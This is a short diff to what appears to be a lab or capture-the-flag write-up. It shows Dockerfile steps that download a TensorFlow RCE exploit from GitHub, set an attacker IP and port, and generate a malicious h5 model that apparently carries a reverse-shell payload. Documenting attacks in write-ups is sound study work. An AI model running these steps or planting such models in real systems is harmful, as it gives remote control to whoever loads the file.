@@ -175,15 +175,15 @@ tensorflow 2.13.1 rce: `https://github.com/Splinter0/tensorflow-rce`
 
 we add this to the Dockerfile build phase:
 ```
-# Download exploit to generate malicious model
+# Download exploit to generate malicious h5 model with payload
 RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py
 
-# Replace IP
+# Replace attacker IP
 RUN sed 's/127.0.0.1/10.10.14.9/g' exploit.py
 
-# Replace port
+# Replace attacker port
 RUN sed 's/6666/4444/g' exploit.py
 
-# Generate malicious h5 model payload
+# Generate malicious h5 model with payload
 RUN python exploit.py
 ```
